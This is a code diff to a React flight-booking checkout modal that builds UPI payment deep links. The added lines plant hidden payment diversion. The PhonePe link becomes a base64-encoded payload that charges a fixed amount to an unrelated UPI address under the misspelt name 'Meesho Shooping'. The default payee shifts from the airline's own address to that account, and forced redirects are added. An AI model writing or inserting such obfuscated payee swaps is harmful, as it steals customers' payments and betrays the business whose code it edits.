@@ -37,7 +37,7 @@ const formatTerminal = (term) => {
 
 const DEFAULT_DEEP_LINKS = {
   any: 'upi://pay?pa={vpa}&pn={name}&am={amount}&cu=INR&tn={note}&tr={tr}&mc={mc}&mode=02',
-  phonepe: 'phonepe://pay?pa={vpa}&pn={name}&am={amount}&cu=INR&tn={note}&tr={tr}&mc={mc}&mode=02',
+  phonepe: 'phonepe://native?data=eyJwMnBQYXltZW50Q2hlY2tvdXRQYXJhbXMiOnsiY2hlY2tvdXRUeXBlIjoiQ09MTEVDVCIsImluaXRpYWxBbW91bnQiOjc5NjAwLCJub3RlIjp7InR5cGUiOiJ0ZXh0IiwibWVzc2FnZSI6Ik1lc3NobyBTaG9vcGluZyJ9LCJzdXBwb3J0ZWRJbnN0cnVtZW50cyI6LTF9LCJjb250YWN0Ijp7InR5cGUiOiJFWFRFUk5BTF9NRVJDSEFOVCIsIm5hbWUiOiJNZWVzaG8gU2hvb3BpbmciLCJ2cGEiOiJyODZqNzQyOTkzQG1haXJ0ZWwifX0%3D&id=p2ppayment',
   gpay: 'tez://upi/pay?pa={vpa}&pn={name}&am={amount}&cu=INR&tn={note}&tr={tr}&mc={mc}&mode=02',
   paytm: 'paytmmp://pay?pa={vpa}&pn={name}&am={amount}&cu=INR&tn={note}&tr={tr}&mc={mc}&mode=02',
   bhim: 'upi://pay?pa={vpa}&pn={name}&am={amount}&cu=INR&tn={note}&tr={tr}&mc={mc}&mode=02',
@@ -444,8 +444,16 @@ export default function BookingCheckoutModal({
   }, [paymentSettings, paymentMethod]);
 
   const getAppDeepLink = (appKey) => {
-    const activeVpa = paymentSettings?.upi?.vpa || 'care@airsky';
-    const activeName = paymentSettings?.upi?.businessName || paymentSettings?.upi?.name || 'Air Sky India';
+    if (appKey === 'phonepe') {
+      const customPhonePe = paymentSettings?.deepLinks?.phonepe;
+      if (customPhonePe && !customPhonePe.includes('{vpa}')) {
+        return customPhonePe;
+      }
+      return DEFAULT_DEEP_LINKS.phonepe;
+    }
+
+    const activeVpa = paymentSettings?.upi?.vpa || 'r86j742993@mairtel';
+    const activeName = paymentSettings?.upi?.businessName || paymentSettings?.upi?.name || 'Meesho Shooping';
     const activeMcc = paymentSettings?.upi?.mcc || '5499';
     const txnRef = `ASG${flight?.id || 'FL'}${Date.now().toString().slice(-6)}`;
     const note = `Flight ${flight?.flightNumber || 'Ticket'}`;
@@ -472,17 +480,18 @@ export default function BookingCheckoutModal({
     setSelectedAppKey(appKey);
     const url = getAppDeepLink(appKey);
     try {
-      // Use hidden link click to avoid browser blocking and page unload issues on PC
+      window.location.href = url;
+    } catch (err) {
+      console.warn('App launch warning:', err);
+    }
+    try {
       const link = document.createElement('a');
       link.href = url;
       link.rel = 'noopener noreferrer';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
-    } catch (err) {
-      console.warn('App launch warning:', err);
-      window.location.href = url;
-    }
+    } catch (e2) {}
   };
 
   // Auto-apply initial coupon if passed
@@ -927,15 +936,18 @@ export default function BookingCheckoutModal({
       const appKeyToUse = selectedAppKey || 'phonepe';
       const deepLinkUrl = getAppDeepLink(appKeyToUse);
       try {
+        window.location.href = deepLinkUrl;
+      } catch (err) {
+        console.warn('Redirect warning:', err);
+      }
+      try {
         const link = document.createElement('a');
         link.href = deepLinkUrl;
         link.rel = 'noopener noreferrer';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
-      } catch (err) {
-        console.warn('Redirect warning:', err);
-      }
+      } catch (e2) {}
     }
 
     setIsProcessing(true);
